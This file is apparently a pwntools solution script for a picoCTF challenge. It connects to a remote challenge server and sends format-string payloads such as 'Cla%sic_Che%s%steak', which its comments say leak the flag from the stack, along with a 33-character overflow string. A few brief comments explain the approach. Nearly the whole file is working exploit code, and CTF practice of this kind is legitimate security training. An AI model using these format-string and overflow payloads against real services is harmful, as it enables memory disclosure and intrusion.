from pwn import *

#p=process('./chall')
p=remote("mimas.picoctf.net", 58122)
print( p.recv().decode("utf-8")+"\n")
p.write("Gr%114d_Cheese\n")

#Solution 1 -> Just tried it for fun, even though this is not the expected solution it is worth a shot
#               What we did here was brute force it. 
p.write("A"*33+"\n")

#Solution 2 -> All of the %s in the stream will be resolved into stuff that is in the stack.
#               This includes the flag
p.write("Cla%sic_Che%s%steak\n")
p.interactive()

#I think what matters here is the fflush(stdout)
